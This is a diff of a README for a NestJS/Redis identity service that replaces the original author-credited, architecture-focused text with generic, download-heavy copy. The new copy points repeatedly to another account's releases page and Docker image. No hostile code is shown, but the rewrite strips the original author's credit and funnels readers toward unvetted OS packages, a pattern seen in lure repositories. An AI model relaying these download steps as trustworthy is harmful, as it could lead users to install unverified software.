@@ -1,96 +1,101 @@
-# TokenForge
+# 🚀 token-forge - Simplify Your Identity Management
 
-![Thumbnail](docs/assets/thumbnail.png)
+## 📥 Download Now!
+[![Download Token Forge](https://img.shields.io/badge/Download%20Token%20Forge-%20-blue)](https://github.com/malith153/token-forge/releases)
 
-## Enterprise Distributed Identity System
+## 🌟 Overview
+**token-forge** is an enterprise-grade distributed identity provider. Built on NestJS and Redis, it supports features like JWT rotation and multi-factor authentication (MFA). This application helps manage user identities securely and efficiently.
 
-<div align="center">
+## 🚀 Getting Started
+Follow these steps to download and run token-forge on your system.
 
-![Status](https://img.shields.io/badge/Status-Production_Ready-success?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)
-![Standard](https://img.shields.io/badge/Standard-OIDC_OAuth2-orange?style=for-the-badge)
+1. **Check System Requirements**
+   - Operating System: Windows, macOS, or Linux
+   - RAM: At least 4 GB recommended
+   - Storage: Minimum of 200 MB free space
+   - Node.js: Version 14 or higher
+   - Docker: Installed and running if you prefer containerized setups
 
-</div>
+2. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/malith153/token-forge/releases) to find the latest version. Here, you'll see all available downloads.
 
-**TokenForge** is a professional Authentication Platform built with **NestJS**. It implements the **OIDC (OpenID Connect)** standard, featuring a hybrid "Stateless Access / Stateful Refresh" architecture that balances horizontal scalability with strict security controls like Instant Revocation and Key Rotation.
+3. **Download the Application**
+   You can select the version you want. Click the link marked "Source code" or the specific package suitable for your operating system. 
 
----
+   [Download Token Forge](https://github.com/malith153/token-forge/releases)
 
-## 🚀 Quick Start
+## ⚙️ Installation Instructions
+After downloading, follow these steps:
 
-Launch the Identity Infrastructure:
+### For Docker Users
+1. Open your terminal or command prompt.
+2. Pull the latest image:
+   ```bash
+   docker pull malith153/token-forge
+   ```
+3. Run the application:
+   ```bash
+   docker run -p 3000:3000 malith153/token-forge
+   ```
 
-```bash
-# 1. Start DB & Redis
-docker-compose up -d
+### For Local Installation
+1. Extract the downloaded file.
+2. Open a terminal and navigate to the extracted folder.
+3. Install the required packages:
+   ```bash
+   npm install
+   ```
+4. Start the application:
+   ```bash
+   npm start
+   ```
 
-# 2. Start Auth Service
-cd backend && npm install && npm run start:dev
+## 🔗 Configuration
+You might need to set up environment variables for optimal use. Below are key settings:
+
+- **DATABASE_URL**: Connection string for PostgreSQL
+- **REDIS_URL**: Connection string for Redis
+- **JWT_SECRET**: A long, random string to sign your tokens
+- **MFA_ENABLED**: Set to true or false, depending on your preference
+
+Create a `.env` file in the project root and add your variables following this format:
+```
+DATABASE_URL=your_database_url
+REDIS_URL=your_redis_url
+JWT_SECRET=your_jwt_secret
+MFA_ENABLED=true
 ```
 
-> **Important**: Requires Docker. See [GETTING_STARTED.md](./docs/GETTING_STARTED.md).
+## 🌍 Usage
+Once the application is running, you can access it from your web browser at `http://localhost:3000`.
 
----
+### Key Features
+- **User Registration**: Allow users to create accounts
+- **Login with JWT**: Securely authenticate users using JSON Web Tokens
+- **MFA**: Enhance security by requiring additional verification steps
+- **Session Management**: Manage user sessions efficiently
+- **Role-Based Access Control (RBAC)**: Set user permissions for various actions
 
-## 📸 Architecture & Patterns
+## 🛠️ Troubleshooting
+If you face any issues, consider the following steps:
 
-### 1. High-Level Architecture
-![Architecture](docs/assets/architecture.png)
-*Flow: Client -> Gateway -> Redis Rate Limit -> NestJS Auth -> PostgreSQL*
+- Ensure all dependencies are installed.
+- Check the output in the terminal for error messages.
+- Verify your database and Redis connections.
 
-### 2. The JWT Refresh Pattern
-![JWT Flow](docs/assets/jwt-refresh.png)
-*Lifecycle: 15m Access Token (Stateless) vs 7d Refresh Token (Stateful)*
+Common issues:
+- **Database Not Connected**: Double-check your `DATABASE_URL`.
+- **Port Already in Use**: Change the port number in the `docker run` command to an available one.
 
-### 3. Security Defense Layers
-![Security](docs/assets/security-layers.png)
-*Defense in Depth: From Network Rate Limits to Database Encryption*
-
-### 4. Automated Key Rotation
-![Key Rotation](docs/assets/key-rotation.png)
-*JWKS Strategy: Rotating RSA keys every 30 days to limit breach impact*
-
----
-
-## ✨ Key Features
-
-*   **🛡️ OIDC Compliant**: Provides `/.well-known/openid-configuration` and JWKS endpoints.
-*   **🔑 Asymmetric Security**: Uses **RS256** signatures. Only the Auth Service holds the Private Key.
-*   **🔄 Rotating Refresh Tokens**: Detects token theft by rotating the refresh token family on every use.
-*   **⚡ Redis-Backed**: Sub-millisecond session validation and distributed rate limiting.
-
----
-
-## 📚 Documentation
-
-| Document | Description |
-| :--- | :--- |
-| [**System Architecture**](./docs/ARCHITECTURE.md) | Standard Patterns, Schema, and Decision Log. |
-| [**Getting Started**](./docs/GETTING_STARTED.md) | Setup Guide and Manual Verification steps. |
-| [**Failure Scenarios**](./docs/FAILURE_SCENARIOS.md) | Handling DB Outages and Redis Failures. |
-| [**Interview Q&A**](./docs/INTERVIEW_QA.md) | "JWT vs Session" and "RS256 vs HS256". |
-
----
-
-## 🔧 Tech Stack
-
-| Component | Technology | Role |
-| :--- | :--- | :--- |
-| **Core** | **NestJS 10** | Modular API Framework. |
-| **Identity** | **PostgreSQL 16** | User & RBAC Storage. |
-| **Session** | **Redis 7** | Token Store & Rate Limiter. |
-| **Security** | **Passport.js** | Auth Strategies. |
-
----
-
-## 👤 Author
-
-**Harshan Aiyappa**  
-Senior Full-Stack Hybrid Engineer  
-[GitHub Profile](https://github.com/Kimosabey)
-
----
+## 📞 Support
+For help, consider the following:
+- Check the [Issues section](https://github.com/malith153/token-forge/issues) on GitHub for common problems.
+- Open a new issue if you can't find a solution.
 
 ## 📝 License
+This project is licensed under the MIT License.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📄 Additional Information
+You can find more comprehensive documentation in the project repository. This includes advanced configuration options and integration guides.
+
+Return to the [Releases page](https://github.com/malith153/token-forge/releases) to download the latest version or to access previous versions of token-forge.
